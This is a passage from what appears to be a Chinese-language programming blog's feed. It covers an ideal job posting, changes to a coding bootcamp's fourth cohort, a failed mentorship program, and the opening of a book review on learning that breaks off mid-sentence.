title="五、技術開發流程"></a>五、技術開發流程</h3><p>大家除了想知道一個需求是怎麼產生的以外，還會想知道工程師在技術上的開發流程，例如說有沒有 code review？用什麼協作平台？部署到哪邊？之類的這些問題。</p><p>寫起來會像是：</p><blockquote><p><em>公司內部使用的程式碼協作平台為 GitHub，內部溝通為 Slack，開發上採用 Trunk Based Development。</em></p></blockquote><blockquote><p><em>每開發一個新功能，就切一條 branch 出去，完成以後在 GitHub 上面開一個 Pull Request，並且 tag 兩名同事進行 code review，，拿到 approved 以後才能 merge。</em></p></blockquote><blockquote><p><em>Merge 時會採用 squash + rebase 的方式來 merge，每一個 PR 只會保留一個 commit。</em></p></blockquote><blockquote><p><em>在每次 sprint 結束的時候會針對技術的部分開一個會議，讓大家提出這兩週一些技術上需要討論的地方，例如說某個 PR 的寫法好不好之類的，進行大概半小時到一小時的技術討論。</em></p></blockquote><h3 id="六、其他細節"><a href="#六、其他細節" class="headerlink" title="六、其他細節"></a>六、其他細節</h3><p>這些東西不知道該怎麼分類，所以就都寫在一起了。</p><p>許多人沒有注意到的小細節，我覺得才是關鍵的差異。像是我在開頭中所說的徵才文裡面就寫著：</p><blockquote><p><em>您之前所寄的履歷我們會印出來，所以您無需攜帶。</em></p></blockquote><blockquote><p><em>但若是有任何您覺得可以加分、或是證明自己能力的文件或成果，歡迎攜帶相關資料</em></p></blockquote><p>看了這邊之後我就知道我去面試時不用自己印履歷，因為公司會準備，貼心，加分。</p><p>把前往公司的流程講得很詳細，對我來說也是加分（這個在開頭給的那篇面試流程裡有提到）：</p><blockquote><p><em>公司地點在台北市信義區信義路四段 XX 號 7 樓，AA 大樓。請在一樓跟警衛說你要去七樓 DDD 公司面試並且換證，由於正值防疫期間，請記得配戴口罩進入大樓。抵達 7樓之後在門口右側有門鈴，按下之後請稍等一會，會有 HR 前往接待。</em></p></blockquote><p>在公司的設備方面也可以寫清楚，例如說：</p><blockquote><p><em>公司目前配給工程師的設備為：</em></p></blockquote><blockquote><p><em>1. 16-inch MacBook Pro(2.6 GHz i7 + 16GB RAM + 512GB SSD)<br>2. 32 吋 4K 螢幕</em></p></blockquote><p>如果公司對於參加技術研討會或是課程有補助也可以寫上去，開頭提到的那些履歷注意事項也可以寫，這些對我來說都是加分的事項。</p><p>在徵才文的排版上，如果能遵照<a href="https://github.com/sparanoid/chinese-copywriting-guidelines">中文排版指北</a>，在中英文之間加個空格，那就再好不過了。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>說實在的，我覺得其實就是將心比心四個字，你在求職的時候想知道什麼事，就在徵才文上面把那些事情都寫清楚。</p><p>徵才文其實某種程度上也反映了這間公司的文化，所以說穿了，這篇除了是「我理想中的徵才文」以外，也是「我理想中的公司文化」，開放、透明，並且在意細節。</p><p>寫了這一長篇，大家看了不一定會有感覺，那不如直接看範例吧！我跟兩位學生 <a href="https://github.com/Lauviah0622">Lauviah0622</a> 以及 <a href="https://github.com/krebikshaw">krebikshaw</a> 合作，由他們負責開發範例網站，我負責填寫內容，做出了一個範例的徵才網站（參考自財報狗），還有一個擬真的 Gmail 來模擬收到面試通知信的情況。</p><p>連結在這邊：<a href="https://lidemy.github.io/jd-example/jd/">https://lidemy.github.io/jd-example/jd/</a></p><p>網站原始碼：<a href="https://github.com/Lidemy/jd-example">https://github.com/Lidemy/jd-example</a></p><p>點下去之後就會看到假的徵才文，拉到最下面，按下「Apply to position」，就會進入到 Gmail 的畫面，點下面試通知信就能看到內容，就把整個我理想中的流程走完了。</p><p>最後，寫完這篇的心得其實跟之前寫完<a href="/2020/04/22/about-head-hunter-27fe1c28648f/">獵人頭觀察報告</a>時一樣，我都只是從一個「客人」的角色去觀察怎樣可以做得更好，但我從來都不是「主人」。</p><p>我沒做過獵頭，也沒做過 HR，說不定我在徵才文上想看到的某些資訊，其實對大部分求職者是扣分的；說不定有些地方寫不清楚，反而能招來更多人；說不定有些東西僅管 HR 也想放，但礙於公司政策或是法規而無能為力。</p><p>也說不定這世界上只有一小撮人在意這些細節，對其他人來說都無關緊要。</p><p>但總之呢，這篇就是我目前對徵才文的看法，以後如果哪天換我寫徵才文，我會盡量朝這個方向去寫，若是碰到哪些窒礙難行或是想得太天真的地方，也會再來寫一篇文章更新一下實際狀況。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第四期課程做了哪些改動？</title>
      <link href="/2020/10/04/lidemy-mentor-program-4th-updates-c344302c8a2d/"/>
      <url>/2020/10/04/lidemy-mentor-program-4th-updates-c344302c8a2d/</url>
      
        <content type="html"><![CDATA[<p>其實這一篇應該在更早一點的時間點就開始寫的，但最近要做的事情有點多，就不小心拖到現在了。</p><p>每次課程結束以後，最開心的就是下一期又可以再繼續優化，把之前想做的事情一件一件慢慢付諸實現。之前在<a href="/2019/12/15/mentor-program-3rd-result-df178bb55f4/">《華麗謝幕：程式導師實驗計畫第三期成果以及未來走向》</a>裡面就有提過一些方向，後來有些真的開始做了，有些還放在 backlog 裡面。</p><p>目前是程式導師實驗計畫第四期的第十六週，課程進行了 100 多天，已經進行一半了。先給幾個數字：</p><ul><li>這一期一共 121 位同學</li><li>有 1 位在第一週時退出，另 1 位在第八週時退出，還有 9 位於課程試用期結束時（第八週）退出</li><li>因此，課程正式開始後剩下 110 位同學，其中 77 人選擇 A 求職方案，剩餘 33 人選擇 B 買斷方案</li><li>目前進行到第十六週，只淘汰掉 1 人，剩餘 A 方案同學為 76 人</li></ul><p>十四週尾聲時的進度分佈如下：</p><pre><code>Week 14   ：19 人（25%）Week 12~13：12 人（16%）Week 10~11：15 人（20%）Week 9    ： 8 人（10%）Week 8    ： 7 人（9%）Week 7    ： 8 人（10%）Week 7 以下： 7 人（9%）</code></pre><p>雖然說有跟上進度的比例還是比想像中的少，但至少這一期最大的不同是，就算進度落後，大家的進度還是有在往前進。</p><p>以上是有關於課程進行到現在的一些數字，接著我會來講一些這一期做的一些改動，會分成幾個部分來講：</p><ol><li>課程安排</li><li>課綱說明</li><li>作業改動</li><li>課程制度</li></ol><h3 id="課程安排"><a href="#課程安排" class="headerlink" title="課程安排"></a>課程安排</h3><p>先講一下在第三期發現的幾個問題：</p><ol><li>PHP 系列課程成效不是很好，因為資源太多太亂，節奏也沒有掌握好</li><li>學生缺少一些工作流程與產品相關知識</li><li>有些課程在第三期設計的有點趕，所以連我自己都很清楚知道那些課程沒有明確主旨，有點像是大雜燴混在一起</li><li>切版課程提供太少，導致學生切版能力偏弱</li></ol><p>針對以上缺點所做的改動：</p><ol><li>把 PHP 課程縮減，三週變兩週，但影片整個重新錄過，提供循序漸進的教學影片讓學生跟著走，預期能夠增進理解程度</li><li>新增產品開發與工作流程（Scrum）相關課程</li><li>把原本很亂的大雜燴課程（SCSS + Cache + 資料結構）拿掉，把前端相關工具整理到同一週一起講。</li><li>加強切版課程並且提供相關資源</li><li>因應 PHP 課程縮減，把原本在很後面的 Express + Sequelize 拿到前面來教，因為這兩個我認為滿好上手的，而且要自己做 project 的時候很方便。</li></ol><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__ytZE6yO3Lwz1HWHF7fRxDQ.png"></p><p>第二點跟第五點因為還沒上到那邊，所以暫時無法驗證成效。在產品開發的部分，我會實際讓大家看看我之前跟 <a href="https://medium.com/u/c7713dd3b6f6">Min</a> 在開發助教系統時所採用的 JIRA board 以及相關的 ticket：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__4IJHA730Xe__vqDbDnkB5Cw.png"></p><p>根據學生目前的狀況，PHP 的改動應該算是滿有用的，至少不會像上一期一樣一堆人死在 PHP 那邊就消失了，所以這個改動還滿不錯的。</p><p>大雜燴課程拿掉以後，把那兩週變成前端相關工具的教學，包括：</p><ol><li>jQuery</li><li>SCSS</li><li>Bootstrap</li><li>gulp</li><li>webpack</li></ol><p>目前感覺還挺不錯的，搭配一些作業可以讓學生更理解這些工具的使用。再者，因為前面被 CSS 跟原生的 JS 折磨很久，所以到這週也能完整體驗到工具誕生的意義，體會到有工具的好處（以及壞處）。</p><p>切版的部分有在 CSS 那一週的進度提供了比較完整的版面，在其他週也都需要切版，在這一期的作業有些也有了設計稿，而且直接找以前的學生幫忙，用 zeplin 出給大家：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__veHgzKW3HoOaIPvJ66HG2Q.png"></p><p>課程的方向之一是盡可能讓大家提早體驗工作後的生活，所以用 zeplin 再好不過了，因為實際去工作之後就是用這樣的模式在跟設計師溝通的。</p><p>總而言之呢，這一期的課綱我目前覺得 ok，學習曲線有比上一期更平滑了一些，但依然還有一些地方可以做得更好就是了。</p><h3 id="課綱說明"><a href="#課綱說明" class="headerlink" title="課綱說明"></a>課綱說明</h3><p>在課綱說明上面也有一些東西想要調整。</p><p>第一，以前課綱每一週的學習資源是用條列式，但這樣的話說明不夠清楚，學生會不知道順序以及要學習到什麼程度，因此第四期改成用文字敘述，清楚了很多。</p><p>舉例來說，以前是這樣：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__FInxfaLLreDyuRtAWU4pvg.png"></p><p>現在則變成這樣：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__TycwWvk4aZGqgZii8Svv__Q.png"></p><p>第二，之前有一個問題是學生學一學有可能失去方向或是缺乏大局觀，不知道以現在的程度，大概可以做出哪些東西。於是這一期的複習周有增加一個「show time 單元」，讓我來示範以我們目前會的東西，發揮一點想像力以後可以做到什麼程度。</p><p>像是第五週就做了一個公車動態的爬蟲：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__JMb__6OXFvFA__EJoJZ1__IlA.png"></p><p>第十週則做出了一個餐廳的網站，還有搭配 PHP 做出的活動報名系統，有簡單的 landing page、報名表單以及系統後台，可以看到有哪些人報名：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__dRfiJ__y08iZXKPxtSF4ksQ.png"></p><p>這個改動我也覺得成效滿不錯的，學生可以很清楚地發現其實我在影片中寫的程式碼，都是他們看過的東西，只是不知道原來搭配起來使用之後，就變成一個網站了。另一個好處則是在 demo 的影片中，我是從頭開始把網站建起來的，他們可以看到一個工程師是怎麼樣從零開始，一步步打造出相對完整的網站。</p><p>再來呢，課綱裡面每一週都有一個「自我檢測」，原本學生以為每一個列出來的都很重要，但是其實沒有，有些我只是希望他們「聽過就好」，因此這一期在自我檢測前面加上優先順序，P1 代表很重要，P2 代表還好，P3 代表聽過就好。</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__QcUeGQ9QTTI3JheCaX4qgg.png"></p><h3 id="作業改動"><a href="#作業改動" class="headerlink" title="作業改動"></a>作業改動</h3><p>第四期的作業其實做了滿大的改動，許多作業都直接砍掉重練了。主要有兩個原因：</p><ol><li>第三期的小作業成效不好，因此決定要做規模大一點的，否則學生眼界太小。那既然要做大一點，與其一次做很大的，不如由小的慢慢堆疊上去，效果會更好</li><li>如果是個從零開始的作業，難度會比較高，可是從零開始幾乎不會出現在工作上，工作都是現有網站加功能或是修 bug，因此作業也朝這方向去出，剛好可以模仿影片把東西做出來，然後藉由加新功能去熟悉。</li></ol><p>所以改動以後的結果是：</p><ol><li>以漸進增強的作業取代零散小作業</li><li>雙主線作業，一條鍛鍊從零開始，另一條鍛鍊加功能以及修 bug</li><li>專案完整度提高</li></ol><p>舉一個例子好了，第六週的作業之一是切一個餐廳的首頁（就是上面給大家看的那個 zeplin 設計稿截圖），第七週則是讓大家切一個常見問題的頁面，第八週則是抽獎活動頁面。</p><p>而把這三個頁面集合起來，其實就是一個簡單的前端餐廳官網了。</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__Pj7EMJKlpp0BO34YJD0WAA.png"></p><h3 id="課程制度"><a href="#課程制度" class="headerlink" title="課程制度"></a>課程制度</h3><h4 id="助教"><a href="#助教" class="headerlink" title="助教"></a>助教</h4><p>課程制度上面差最多的就是這一期有了助教，幾乎都是找以前的學生來擔任。會有助教主要是因為人變多了，需要人幫忙，再來就是助教會比老師距離感更近一點，預期學生問問題會更踴躍。</p><p>有了助教以後，也在學習系統上面補上了交作業的機制，會隨機分配到一個助教批改，目前有大概一千多份作業：</p><p><img src="/img/lidemy-mentor-program-4th-updates-c344302c8a2d/1__FSah1u3gakEppw4__4gzLGw.png"></p><p>而助教機制帶來的效益比我想像中還要高，因為他們看作業的時候都滿認真的，然後也的確達到了我一開始所預想的：「提問意願變高」這件事情。而且助教有時候也會自發性地去做一些嘗試，這些都是我一開始沒有想像到的部分。</p><p>另外，助教 minw 在課程的部分也幫忙了很多，有幫我錄了一些我不是很熟的部分（CSS 相關），這邊再次感謝！</p><h4 id="有關社群"><a href="#有關社群" class="headerlink" title="有關社群"></a>有關社群</h4><p>說老實話，我一開始根本沒打算管什麼社群。</p><p>身為一個基本上不喜歡與陌生團體交流，喜歡默默做自己事情，一路以來學習也都是靠自己居多的人，沒有體會到什麼社群的好處（這邊補充一下，也不是說沒有體會到社群的幫助，而是沒有一個「固定的小團體」之類的，受到整個網路或是論壇的幫助比較大），也不覺得學習需要跟著別人一起。</p><p>可是或許我不需要沒有錯，但學生需要。</p><p>無論是從第一期就開始有的進度報告制度，還是從上一期開始的小樹屋制度，其實對於同學的幫助都滿大的。在無意間，Lidemy 的程式導師實驗計畫形成了一個小小的學習社群，而且充滿著學習能量。</p><p>原本只是為了看大家進度的每日進度報告，演變成學生之間彼此的精神糧食（？），因為一打開系統就可以看到好多其他同學都在繼續努力著，就會覺得有人跟著你一起學習，形成了一股督促自己的力量。</p><p>當你在進度報告上寫下自己的困難時，會收到同學的關心，儘管沒有碰過面，甚至也沒有聊過幾句話，但那樣的關心還是很有力量的。也有同學會 po 一些好笑的 meme，或者是私訊同學幫助 debug，這些交流都是自動自發形成的。</p><p>這一塊的效益好像遠比我想像中的還要大，以後可以再多想一下。不過要注意的是分寸要拿捏好，我希望看到這個社群是自然的，而不是很刻意而且很有壓迫性的那一種，我不喜歡那種，也不會讓這邊變成那一種。</p><h3 id="自我檢討"><a href="#自我檢討" class="headerlink" title="自我檢討"></a>自我檢討</h3><p>稍微筆記幾個如果有下一期想要改進的事項。</p><p>第一，課程第四週都是網路相關的，最後會用到 Node.js 上的 request 這個 library 帶大家發 request，但這不太好，第一個原因是這套已經 deprecated 了，第二個原因是這名稱很誤導，我怕有人以為這就是 request。</p><p>再者，他的文件很豐富沒錯，但第一點是全英文，第二點是範例的部分可以再加強。在第四週，我希望學生培養的能力是看全英文文件，還是理解網路相關知識？是後者，所以我不該讓前者成為一個障礙。</p><p>下一期我會想要自己包一個簡單的 library 並且自己寫文件，屏除這個障礙，讓大家把重心放在理解網路相關知識上面。</p><p>第二，切版的課程有空的話我想整個打掉重做，因為目前的講解方式我不喜歡，比較像是先講各個屬性在幹嘛，才講怎麼使用。但我覺得比較理想的方式是邊教就可以邊帶大家切版了，不需要先把屬性講完才開始。</p><p>第三，學習系統也有些功能想要加強，目前的課綱都是放在 GitHub 上，我之後想把課綱裡面的挑戰題移到學習系統上，原因是我認為進度落後太多的人，不應該讓他們看到挑戰題，因為那是給進度領先的人看的，太過於執著於要把所有題目解完，只會把進度越拖越慢，然後就很難再追上，甚至很難繼續跟著課程。</p><p>因此我想限制只有進度上的人看得到挑戰題，沒在進度上的就當作沒這回事。等到課程結束，再把所有挑戰題都開放出來。</p><p>第四，這是我突然想到的想法，我在想有沒有機會弄一個 knowledge base 之類的東西，或至少把我一直很想架的論壇給弄出來，這樣學生比較好搜尋過之前有沒有類似的問題，不然每一期其實都是全新的一期，但有很多東西是可以沿用的，那些問題跟回答如果能夠重用的話，幫助會很大。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這一期的改動裡面，制度上我最喜歡的是新增的助教制度，課程上我最喜歡的是作業的改動還有 show time 這個單元，作業變得有連貫性之後規模就可以變大一些，也會強迫讓學生去改自己之前寫的程式碼，過一陣子回頭看的時候會更有感覺一些。</p><p>show time 也能讓學生體會到程式的魔力，認識到自己的能力其實比想像中還要強，只是缺乏了一些經驗跟想像力而已。</p><p>沒想到第四期也就這樣慢慢步入尾聲了，再過一個月，課程就只剩下最後面的 React 了！那邊結束以後就差不多要開始準備求職，然後一期就這樣要結束了。目前對於下一期有一些規劃跟想法，沒意外的話會有第五期，但課程制度還有收費方式應該會變得不太一樣。</p><p>這是一條永無止盡的路，我還在路上走著，而且一直都覺得沿途風景挺有趣的，暫時還沒打算要停下來。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端引路人計畫失敗心得</title>
      <link href="/2020/10/02/failed-mentorship-program-70a3c50caf7f/"/>
      <url>/2020/10/02/failed-mentorship-program-70a3c50caf7f/</url>
      
        <content type="html"><![CDATA[<p>一年前，我在 Medium 上面發布了這篇文章：<a href="/2019/07/25/mentorship-program-350db93d5c9c/">真正的 Mentorship program：前端引路人計畫</a></p><p>內容主要是我想當 mentor 所以在找 mentee，可以指導的範圍大概是：</p><ol><li>特定主題研究及技術文章撰寫</li><li>技術相關小遊戲製作</li><li>做 side project 並且開源</li><li>其他技術問題</li><li>職涯相關問題</li></ol><p>過了一年，該是時候跟大家報告結果了（雖然標題已經有了就是了）。在報告結果之前，我們先跟著時間回顧一下這個計畫吧。</p><h3 id="計畫初期（2019-年-8-月）"><a href="#計畫初期（2019-年-8-月）" class="headerlink" title="計畫初期（2019 年 8  月）"></a>計畫初期（2019 年 8  月）</h3><p>這個計畫大約 46 個人報名，一共有 22 位錄取。</p><p>計畫開始的時候我先把大家拉到了 slack 群組裡面，並且寫了一份計畫的說明：<a href="https://github.com/aszx87410/mentorship-program">https://github.com/aszx87410/mentorship-program</a></p><p>之後花了大概兩週的時間跟大多數人語音通話過，主要就是溝通一下對這個計畫的期待，以及確認我可以幫忙的地方，也花了些時間跟每一個人確認之後想要做的主題，有些人會想做一個小專案，有些人則是寫文章之類的。</p><p>接著有關於這個計畫進行的方式，當初的流程是這樣：</p><ol><li>根據自己訂的進度做出東西</li><li>碰到問題找我討論，把問題寫成文字丟給我（沒問題可跳過此步驟）</li><li>我會找時間回覆你，為了避免多次 round-trip，請把問題寫清楚</li><li>寫進度報告 po issue，說明討論內容以及當前進度跟下週進度</li><li>回到第 1 步</li></ol><p>基本上每週都會要求要有一些進度，然後簡單寫一下自己的進度，有問題就可以跑來問我找我討論，沒問題的話就繼續跟著自己進度走就好。</p><p>就這樣子試跑了一個月以後，我發現成效不彰，效果還滿差的。</p><p>我自己猜測的原因有幾個，第一個是想像跟現實是兩回事。很多人在報名之前，可能只有想到好的那一面，想說自己可以成長多少，但是卻忘記了要付出的時間與精力。</p><p>因為每一個學生都是有正職工作的，所以可以利用的時間基本上就是下班後還有假日。有些人其實之前並沒有利用這些時間進修過，所以真的體驗過才知道那是多困難的一件事，並沒有想像中的簡單。</p><p>再來，我在開這計畫之前，我以為大家缺的是一個導師，是一個能讓人發問以及討論問題的人。但我後來發現對其中一部分的人來說並不是如此，他們缺的是一個可以督促他們的人。</p><p>在兩者有什麼不同？如果你要找一個跟你討論問題的人，你必須先準備好問題，必須先碰到過問題；要碰到問題，就必須自己動手去做過。但如果什麼東西都還沒開始做，是沒有問題可以問的。</p><p>而有些人就是處在這個狀態，因為還沒開始，所以沒問題可以問，也不知道該討論什麼。因此後來我有改變了一下做法，試著當那個督促的人，看能不能幫大家多少增加一些動力。</p><h3 id="計畫中期"><a href="#計畫中期" class="headerlink" title="計畫中期"></a>計畫中期</h3><p>之後有八成左右的互動，都是這樣發展的：</p><ol><li>學生提了要做某個東西，我看過之後說 ok 沒問題，進度自己抓一下就好</li><li>一週過後，在實作上碰到問題就會來找我討論，如果沒有的話就是自己 po 說做了些什麼，然後我會看一下</li><li>一週又過去了，繼續來找我討論進度跟問問題</li><li>然後某一週，就不見了</li></ol><p>大概從這個時候開始，整個計畫就差不多可以宣告失敗了。</p><p>雖然說是為期一年的計畫，但大概過了兩三個月之後，參與的人就只剩 4, 5 個了。一年過後，只剩下 2 個完整跟完的。</p><h3 id="計畫後期"><a href="#計畫後期" class="headerlink" title="計畫後期"></a>計畫後期</h3><p>跟中期其實差不多，還是維持一樣的模式，就是你要先準備好東西來找我討論，否則我也不會主動去找你。</p><p>跟中期的差別就是人數愈來愈少。</p><p><img src="/img/failed-mentorship-program-70a3c50caf7f/1__EMUGvwLAqEV0ZyVQXDMvLg.png"></p><h3 id="失敗原因"><a href="#失敗原因" class="headerlink" title="失敗原因"></a>失敗原因</h3><p>我自己覺得這個計畫最失敗的點，就是我自己可能也還沒想得很清楚我要做什麼。當初的想法就只是，好像自己可以提供一些資源來做些什麼，能夠解惑一些疑難雜症之類的。</p><p>但實際跑過之後才知道，並不是每個人都有這麼多問題需要被幫忙。對很多人來說，問題都只是非常短暫的。例如說剛好要換工作所以有問題，或者是工作上剛好這邊有問題，但除了這幾個時間點以外，其他時候都是沒有什麼問題的。</p><p>因此，如果只是想提供這種顧問諮詢服務，之前的請我吃飯企劃其實效益還比較大，一頓飯就可以解決了。</p><p>再來還有個問題我覺得跟我的個性有關，因為通常在看學生的一些專案進度時，我最常說的就是：「這個不錯」或是「這個 ok，沒什麼問題」，因為我就真的覺得沒什麼問題。</p><p>我就會覺得你現在這樣寫也不錯，換個寫法也 ok，換個切入點也可以。只要在技術上的描述沒有什麼明顯的錯誤，你的寫作風格要怎麼寫我不會干涉。可以是那種百科全書式的筆記文章，也可以是充滿一堆 meme 跟電影台詞的幽默文章，也可以是被技術文章耽誤的輕小說家，把技術文當小說來寫。</p><p>因為我真的覺得都可以。</p><p>但或許也是因為這樣，可能有些人覺得並沒有得到什麼特別的收穫。</p><p>最後，這個計畫最失敗的點，就是兩敗俱傷。因為我覺得我沒做到什麼，然後一開始來參加的那些學生也覺得自己沒做到事情，然後可能還會對淡出這個計畫感到有點抱歉。</p><p>所以沒有人從中獲益，他們沒有，我也沒有。</p><p>不過有跟完的兩個學生應該是有得到一些東西的，底下是他們的心得：</p><h4 id="學生心得-1"><a href="#學生心得-1" class="headerlink" title="學生心得 #1"></a>學生心得 #1</h4><p>好快，『前端引路人計畫』已經快一年了，一年前我希望多學習前端的技能，剛好 Huli 有這樣的計畫，在報名的當下，我明瞭 Huli 的教法是適合我的，大大的教學理念我也認同，所以沒有太多的猶豫就報名了這個計畫。</p><p><strong>計畫進行的方式：</strong><br>1. 每週報告進度<br>每週報告的方式我覺得蠻好的，因為平日要上班，每週報告壓力不會太大，也不會太放鬆，淺意識我會記得我在參加一個計畫</p><p>2. 自己定目標<br>自己定目標，也是一個學習，每個禮拜日確認自己訂的每週目標是否有達成，如果沒有，下次要怎麼避免（我通常就是把每週的進度減少），找出一個自己可以執行的學習計畫。</p><p>3. 有問題就直接留言問大大<br>Huli 大大一如往常給了許多好的學習建議，非常謝謝</p><p><strong>建議：</strong><br>如果真的有什麼建議，或許是可以固定一段時間，例如兩個月或三個月，有一個比較正式，直接的交換意見，但其實我也不是很確定，因為文字訊息一樣可以達到溝通的目的，所以不是太確定這樣的行為，可以帶來什麼效益</p><p><strong>心得收穫：</strong><br>因為把計畫的百分之七十時間，用來追程式導師線上課程，這堂課本來就有很好的課程安排，所以大部分的主題，並不需要自己花時間找資料，這或許也幫忙了我把心思放在安排課程進度與學習上。最近又開始通車看大大的文章，再次看到大大提到的，如果你想某個技能變厲害，就必須付出時間去練習。參與這個計畫，真的必須付出相當多的時間，有時 delay 我會工作請假把課程補起來，總的來說，我是覺得時間很不夠，假日我都待在家追進度。如果說參與這個計畫最大的收穫是什麼？那應該是認識學習的方法與持續學習的習慣。也再次謝謝大大無私地開了這個計畫。</p><h4 id="學生心得-2"><a href="#學生心得-2" class="headerlink" title="學生心得 #2"></a>學生心得 #2</h4><p>請參考：<a href="https://www.maxlist.xyz/2020/09/21/huli-mentor/">Huli 引路人計畫 52 週過後 &amp; 這一年學習分享</a></p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>經過這次之後，我覺得我暫時不適合這種模式，所以引路人也不會有第二期。我比較適合的可能還是一直有在持續做的教學模式，我來教，你來學，而不是像我原本預期的 mentor 制可以互相討論問題之類的。</p><p>所以之後比較有可能走的方向是規劃一些給已經有工作經驗的工程師來上的課，藉由這些課程來提升技術，讓技術能力能有所成長。除了技術能力以外，有什麼其他問題也可以順便問我，以技術為主，其他疑難雜症為輔，或許這是目前比較適合我的。</p><p>最後，感謝曾經有報名以及有錄取的前端引路人計劃的學生們。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>讀了之後心有戚戚焉的《下班後1小時的極速學習攻略》</title>
      <link href="/2020/09/07/learning-how-to-learn-7c92be9b72fa/"/>
      <url>/2020/09/07/learning-how-to-learn-7c92be9b72fa/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/learning-how-to-learn-7c92be9b72fa/0__BYGK9YikTFeS6YM7.jpg"></p><p>前一陣子收到采實文化的來信，邀請我閱讀並分享一本新書：《<a href="https://www.books.com.tw/products/0010865071">下班後1小時的極速學習攻略</a>》，雖然說很久沒有看書了，但第一次收到出版社的邀請滿開心的，就直接答應了下來。</p><p>上個週末花了點時間把這本書給看完，覺得讀這本書的時機真是對極了。這是一本在講學習的書，雖然說書名跟作者的背景都會讓人以為這本書是只給上班族看的，但其實裡面提到的東西，就算不是上班族也很受用。</p><p>而我會說時機很對，是因為我一直有在帶一個線上的課程：<a href="https://bootcamp.lidemy.com/">程式導師實驗計畫</a>，從計劃當中可以觀察學生學習的狀況，也可以看到他們所寫的心得，這是第四期的計畫了，從前幾期的累積中，對於「學習」這件事也是有些自己的看法。</p><p>底下我將會分享一些看完書以後的心得，也會從書中節錄一些我很有感觸的段落。</p><h3 id="學習的訣竅就是：先別急著學習"><a href="#學習的訣竅就是：先別急著學習" class="headerlink" title="學習的訣竅就是：先別急著學習"></a>學習的訣竅就是：先別急著學習</h3><p>無論是學習，或者是做其他事情也好，有許多人都忽略了「事前準備」的重要性。什麼都還沒準備，就直接捲起袖子下去做事了。</p><p>以前在學校上課時，老師總是會強調預習的重要，因為有預習過的話，就能大概知道課堂上會教些什麼東西，也能夠更清楚整張學習地圖長什麼樣子，知道自己在上面的哪一個位置。</p><p>在做運動之前也都會先暖身，把筋拉開，把身子暖起來之後才開始做運動，讓身體有足夠的伸展，在運動時才比較不容易受傷。</p><p>寫程式也是一樣的，當接到一個新功能的需求時，絕對不是直接開啟帥氣的編輯器開始寫 code。事實正好相反，寫 code 是最後一件事。在寫 code 之前，我一定會把相關的規格文件看過一遍，知道這個功能的範圍多大，會影響到什麼。</p><p>在看規格的時候，腦中也同時規劃起了程式碼，例如說這邊要新增一個頁面，這邊要用 function 包起來，這邊要注意畫面的狀態等等。事先思考過的好處，就是真的動手做事時不會迷失，不會不知道自己現在在哪裡。</p><p>之前在教學時，我就有一個章節的標題是：<a href="https://github.com/Lidemy/ALG101-too-weak-to-leetcode/tree/master/unit1">要學好程式，從不要寫程式開始</a>，比起先寫 code，還有更多事情是更該做，也更值得做的。</p><p>而這本書也是同樣的，它並不是直接就教你一些學習的方法，而是先從計畫開始。你為什麼想學習？有準備好什麼樣的計畫？學習的目標訂在哪裡？這些都是在開始前應該先想過的。當然，這並不是說沒有想過就不能開始，但若是你有先想過這些問題，學習起來會更容易。</p><p>而在學習之前最重要的，就是要清楚自己的目標：</p><blockquote><p><em>沒有哪一種努力是沒有目標的。做任何一件事必然都有其原因，而目標中「有多少自己的想法」，決定了你努力的程度。這個乘載著個人動機的目標，將督促你繼續向前邁進。</em></p></blockquote><blockquote><p><em>假設你正規劃這次暑假出國旅行，為了避免休假行程出問題，你會盡最大努力及時完成手邊工作；雖然專心投入工作耗費心神，但是越靠近休假（目標），你的心情越好。</em></p></blockquote><blockquote><p><em>反之，假設你工作的目標只是為了達到公司年度營業額，情況又是如何？也許在工作態度上就有所不同，不像為了自己的旅遊而工作那樣積極。即使是處理相同的工作，目標是否由自己設定，將會影響工作的態度。</em></p></blockquote><blockquote><p><em>—— 節錄並改寫自下班後 1 小時的極速學習 p.29</em></p></blockquote><p>為了自己學習顯然是目標性最強的。書中給出的例子也滿合理，確實是這樣。在休假之前都會確保自己的東西不出問題，不然休假時就沒有辦法安心。</p><p>不過很多人可能沒有辦法有這麼強的目標性，對他來說學程式就只是一件「可以試試看」的事情。但儘管如此，還是可以幫自己設定一個目標，例如說「我要學到可以寫出個人網站」或是「我要學到可以出去找工作」之類的。</p><p>以我的課程來說，幫大家設定的目標就是：「找到工程師的工作」。</p><h3 id="學習的時間以及空間管理"><a href="#學習的時間以及空間管理" class="headerlink" title="學習的時間以及空間管理"></a>學習的時間以及空間管理</h3><p>在學習上許多人會有一個迷思，認為「全職學習就一定時間比較多」，這句話半對半錯。正解是：「可以學習的時間確實變多了，但真正拿來學習的時間則不一定」。</p><p>我自己在<a href="/2020/02/02/i-failed-9386c6b0a681/">閉關修煉</a>的時期或甚至更早以前，就有這樣的感觸了。時間多是一回事，有多少時間可以有效利用又是另外一回事。一天上班八個小時，回家學習一個小時，跟一天看 YouTube 三小時、玩遊戲三小時、學習一小時，兩者在學習的時間上是一樣的。</p><p>學習的時間應該根據自己的狀況去調整，而不是一直訂著根本沒完成過的計畫，然後相信自己一定做得到。「Hope is not a 